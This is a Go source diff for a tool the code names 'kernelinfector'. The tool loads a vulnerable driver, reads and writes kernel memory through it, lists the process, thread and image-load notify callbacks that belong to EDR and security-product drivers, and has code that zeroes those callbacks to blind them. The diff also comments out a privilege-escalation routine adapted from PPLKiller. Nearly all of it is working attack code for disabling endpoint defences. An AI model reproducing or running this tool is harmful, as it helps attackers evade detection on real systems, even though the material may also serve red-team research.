@@ -8,8 +8,8 @@ import (
 	"encoding/csv"
 	"fmt"
 	"io"
+	"math"
 	"os"
-	"os/exec"
 	"strconv"
 	"strings"
 	"syscall"
@@ -42,6 +42,7 @@ type SECURITY_ATTRIBUTES struct {
 }
 
 //sys EnumDeviceDrivers(lpImageBase uintptr, cb uint32, lpcbNeeded *uint32) (ret bool) = psapi.EnumDeviceDrivers
+//sys GetDeviceDriverBaseNameW(lpImageBase uintptr,lpBaseName uintptr, nSize uint32) (ret uint32,err error) = psapi.GetDeviceDriverBaseNameW
 //sys LoadLibraryW(lpLibFileName string) (handle uintptr, err error) = kernel32.LoadLibraryW
 //sys GetProcAddress(hModule uintptr,lpProcName string) (address uintptr, err error) = kernel32.GetProcAddress
 //sys FreeLibrary(hLibModule uintptr) (ret bool) = kernel32.FreeLibrary
@@ -70,27 +71,6 @@ type SECURITY_ATTRIBUTES struct {
 // windows.GetLastError()
 // windows.OpenSCManager()
 // windows.LoadLibrary()
-
-/*
-from CheekyBlinder
-type Offsets struct {
-	Process  DWORD64
-	Image    DWORD64
-	Thread   DWORD64
-	Registry DWORD64
-}
-*/
-
-/*
-ntoskrnlVersion,
-PspCreateProcessNotifyRoutineOffset,
-PspCreateThreadNotifyRoutineOffset,
-PspLoadImageNotifyRoutineOffset,
-_PS_PROTECTIONOffset,
-EtwThreatIntProvRegHandleOffset,
-EtwRegEntry_GuidEntryOffset,
-EtwGuidEntry_ProviderEnableInfoOffset
-*/
 
 type NtoskrnlOffsets struct {
 	ntoskrnlVersion                string
@@ -138,6 +118,18 @@ const (
 		windows.READ_CONTROL
 )
 
+const (
+	//NtoskrnlOffsetType
+	CREATE_PROCESS_ROUTINE            = 0
+	CREATE_THREAD_ROUTINE             = 1
+	LOAD_IMAGE_ROUTINE                = 2
+	PROTECTION_LEVEL                  = 3
+	ETW_THREAT_INT_PROV_REG_HANDLE    = 4
+	ETW_REG_ENTRY_GUIDENTRY           = 5
+	ETW_GUID_ENTRY_PROVIDERENABLEINFO = 6
+	_SUPPORTED_NTOSKRNL_OFFSETS_END   = 7
+)
+
 type SECURITY_DESCRIPTOR struct {
 	Revision byte
 	Sbz1     byte
@@ -148,21 +140,18 @@ type SECURITY_DESCRIPTOR struct {
 	Dacl     uintptr
 }
 
-/*
-from CheekyBlinder
-func getVersionOffsets() Offsets {
-	winver := w32.RegGetString(w32.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
-	fmt.Printf("[+] Windows Version %s Found!\n", winver)
-	switch winver {
-	case "1909":
-		return Offsets{0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48}
-	case "2004":
-		return Offsets{0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48}
-	default:
-		fmt.Println("[!] Version Offsets Not Found!")
-		return Offsets{0, 0, 0, 0}
-	}
-} */
+type KRNL_CALLBACK struct {
+	driver         string
+	callbackAddr   uint64
+	callbackStruct uint64
+	callbackFunc   uint64
+	removed        bool
+}
+
+type FOUND_EDR_CALLBACKS struct {
+	index         uint64
+	EDR_CALLBACKS [256]KRNL_CALLBACK
+}
 
 func RegGetString(hKey int, subKey string, value string) string {
 	var RRF_RT_REG_SZ uint32 = 0x00000002
@@ -214,7 +203,7 @@ func getDriverHandle() HANDLE {
 		fmt.Println("[!] Unable to obtain a handle to the device object")
 		return HANDLE(device)
 	} else {
-		fmt.Printf("[+] Device object handle obtained: %x", device)
+		fmt.Printf("[+] Device object handle obtained: %x\n", device)
 		return HANDLE(device)
 	}
 }
@@ -271,7 +260,7 @@ func readMemoryDWORD64(device HANDLE, adr DWORD64) DWORD64 {
 	return (readMemoryDWORD(device, adr+4) << 32) | readMemoryDWORD(device, adr)
 }
 
-func patternSearch(device HANDLE, s DWORD64, e DWORD64, p DWORD64) DWORD64 {
+/* func patternSearch(device HANDLE, s DWORD64, e DWORD64, p DWORD64) DWORD64 {
 	r := int(e - s)
 	for i := 0; i < r; i++ {
 		ct := readMemoryDWORD64(device, s+DWORD64(i))
@@ -281,19 +270,7 @@ func patternSearch(device HANDLE, s DWORD64, e DWORD64, p DWORD64) DWORD64 {
 	}
 	return 0
 }
-
-/*
-from CheekyBlinder
-func findProcessCallbackRoutine(r string) {
-	offsets := getVersionOffsets()
-	device := getDriverHandle()
-	addr1 := getFunctionAddress("PsSetCreateProcessNotifyRoutine")
-	addr2 := getFunctionAddress("IoCreateDriver")
-	// paddr := patternSearch(device, addr1, addr2, offsets.Process)
-	// offset := readMemoryDWORD(device, paddr-0x0c)
-
-} */
-
+*/
 func TrusteeValueFromSID(sid *windows.SID) windows.TrusteeValue {
 	return windows.TrusteeValue(unsafe.Pointer(sid))
 }
@@ -621,6 +598,143 @@ func getNtoskrnlVersion() NtoskrnlOffsets {
 	return ntoskrnlOffsets
 }
 
+func findNtoskrnlBaseAddress() DWORD64 {
+	cbNeeded := uint32(0)
+	var drivers [1024]DWORD64
+	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
+		return drivers[0]
+	}
+	//need error response
+	return drivers[0]
+}
+
+func findDriver(adr DWORD64) (string, error) {
+	fmt.Printf("Address: %x\n", adr)
+	cbNeeded := uint32(0)
+	var drivers [1024]DWORD64
+	var diff DWORD64
+	minDiff := DWORD64(math.MaxUint64)
+	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
+		cDrivers := int(cbNeeded / 8) //8 means sizeof(drivers[0])
+		for i := 0; i < cDrivers; i++ {
+			if drivers[i] <= adr {
+				diff = adr - drivers[i]
+				if diff < minDiff {
+					minDiff = diff
+				}
+			}
+		}
+	} else {
+		fmt.Printf("[!] Could not resolve driver for %x, an EDR driver might be missed\n", adr)
+		return "", nil
+	}
+	var szDriver [1024]uint16
+	_, err := GetDeviceDriverBaseNameW(uintptr(adr-minDiff), uintptr(unsafe.Pointer(&szDriver)), 1024)
+	if err != nil {
+		return "", err
+	}
+	driver := syscall.UTF16ToString(szDriver[:])
+	return driver, nil
+}
+
+func operateNotifyRoutines(notifyRoutineAddress DWORD64, edrDrivers *FOUND_EDR_CALLBACKS, remove bool) {
+	device := getDriverHandle()
+	currentEDRDriversCount := 0
+	maxCallbacks := 64
+	for i := 0; i < maxCallbacks; i++ {
+		callbackStruct := readMemoryDWORD64(device, notifyRoutineAddress+DWORD64(i*8)) //8 means sizeof(DWORD64)
+		if callbackStruct != 0 {
+			callback := (callbackStruct &^ 0b1111) + 8
+			cbFunction := readMemoryDWORD64(device, callback)
+			driver, err := findDriver(cbFunction)
+			if err != nil {
+				fmt.Println(err)
+				//panic(err)
+			}
+			if driver != "" && isDriverEDR(driver) {
+				callbackAddr := notifyRoutineAddress + DWORD64(i*8) //8 means sizeof(DWORD64)
+				newFoundDriver := KRNL_CALLBACK{}
+				newFoundDriver.callbackAddr = uint64(callbackAddr)
+				newFoundDriver.callbackStruct = uint64(callbackStruct)
+				newFoundDriver.callbackFunc = uint64(cbFunction)
+
+				if !remove {
+					fmt.Printf("[+] Found EDR driver callback: '%s' [callback addr: %x | callback struct: %x | callback function: %x]\n", driver, callbackAddr, callbackStruct, cbFunction)
+					newFoundDriver.removed = false
+				} else {
+					fmt.Printf("[+] Removing EDR driver callback: '%s' [callback addr: %x | callback struct: %x | callback function: %x]\n", driver, callbackAddr, callbackStruct, cbFunction)
+					writeMemoryDWORD64(device, callbackAddr, 0x0000000000000000)
+					newFoundDriver.removed = true
+				}
+				fmt.Println(int(edrDrivers.index))
+				edrDrivers.EDR_CALLBACKS[int(edrDrivers.index)+currentEDRDriversCount] = newFoundDriver
+				currentEDRDriversCount++
+			}
+		}
+
+	}
+	edrDrivers.index = edrDrivers.index + uint64(currentEDRDriversCount)
+	if currentEDRDriversCount == 0 {
+		fmt.Println("[+] No EDR driver(s) found!")
+	} else if remove {
+		fmt.Printf("[+] Removed a total of %d EDR / security products driver(s)\n", currentEDRDriversCount)
+	} else {
+		fmt.Printf("[+] Found a total of %d EDR / security products driver(s)\n", currentEDRDriversCount)
+	}
+	CloseHandle(device)
+}
+
+func (nOffsets *NtoskrnlOffsets) toNtoskrnlOffsets(nrt int) DWORD64 {
+	switch nrt {
+	case CREATE_PROCESS_ROUTINE:
+		return DWORD64(nOffsets.pspCreateProcessNotifyRoutine)
+	case CREATE_THREAD_ROUTINE:
+		return DWORD64(nOffsets.pspCreateThreadNotifyRoutine)
+	case LOAD_IMAGE_ROUTINE:
+		return DWORD64(nOffsets.pspLoadImageNotifyRoutine)
+	case PROTECTION_LEVEL:
+		return DWORD64(nOffsets.psProtection)
+	case ETW_THREAT_INT_PROV_REG_HANDLE:
+		return DWORD64(nOffsets.etwThreatIntProvRegHandle)
+	case ETW_REG_ENTRY_GUIDENTRY:
+		return DWORD64(nOffsets.etwRegEntryGuidEntry)
+	case ETW_GUID_ENTRY_PROVIDERENABLEINFO:
+		return DWORD64(nOffsets.etwGuidEntryProviderEnableInfo)
+	}
+	return 0
+}
+func getPspXNotifyRoutineAddress(nrt int, nOffsets *NtoskrnlOffsets) DWORD64 {
+	ntoskrnlBaseAddress := findNtoskrnlBaseAddress()
+	pspXNotifyRoutineOffset := nOffsets.toNtoskrnlOffsets(nrt)
+	pspXNotifyRoutineAddress := ntoskrnlBaseAddress + pspXNotifyRoutineOffset
+	return pspXNotifyRoutineAddress
+}
+
+func enumPspXNotifyRoutine(nrt int, edrDrivers *FOUND_EDR_CALLBACKS, nOffsets *NtoskrnlOffsets) {
+	notifyRoutineTypeStrs := [3]string{"process creation", "thread creation", "image loading"}
+	notifyRoutineTypeNames := [3]string{"ProcessCreate", "ThreadCreate", "LoadImage"}
+	pspXNotifyRoutineAddress := getPspXNotifyRoutineAddress(nrt, nOffsets)
+	fmt.Printf("[+] Enumerating %s callbacks\n", notifyRoutineTypeStrs[nrt])
+	fmt.Printf("[+] Psp%sNotifyRoutine: %x\n", notifyRoutineTypeNames[nrt], pspXNotifyRoutineAddress)
+	operateNotifyRoutines(pspXNotifyRoutineAddress, edrDrivers, false)
+}
+
+func enumAllEDRKernelCallbacks() {
+	ntoskrnlOffsets := getNtoskrnlVersion()
+	ntoskrnlVersion := ntoskrnlOffsets.ntoskrnlVersion
+	if ntoskrnlVersion == "" {
+		fmt.Printf("NtoskrnlVersion not found -> %s\n", ntoskrnlOffsets.ntoskrnlVersion)
+		return
+	}
+	fmt.Printf("NtoskrnlVersion is %s\n", ntoskrnlOffsets.ntoskrnlVersion)
+	var edrDrivers FOUND_EDR_CALLBACKS
+	enumPspXNotifyRoutine(CREATE_PROCESS_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
+	enumPspXNotifyRoutine(CREATE_THREAD_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
+	enumPspXNotifyRoutine(LOAD_IMAGE_ROUTINE, &edrDrivers, &ntoskrnlOffsets)
+}
+
+/*
+//PPLKiller
 func makeSystem() {
 	cpid := DWORD64(os.Getpid())
 	offsets := getVersionOffsets()
@@ -665,18 +779,21 @@ func makeSystem() {
 	_ = cmd.Run()
 }
 
+*/
 func main() {
+
 	usage := "Usage: kernelinfector.exe OPTION\n/proc - List Process Creation Callbacks\n/delproc <address> - Remove Process Creation Callback"
 	getNtoskrnlVersion()
 	if len(os.Args) < 2 {
 		fmt.Println(usage)
-	} else if os.Args[1] == "/proc" {
+	} else if os.Args[1] == "/enum" {
+		enumAllEDRKernelCallbacks()
 		//findProcessCallbackRoutine("")
 	} else if os.Args[1] == "/deproc" && len(os.Args) == 3 {
 		//r := os.Args[2]
 		//findProcessCallbackRoutine(r)
 	} else if os.Args[1] == "/systemcmd" {
-		makeSystem()
+		//makeSystem()
 	} else if os.Args[1] == "/install" {
 		installVulnDriver()
 	} else if os.Args[1] == "/uninstall" {
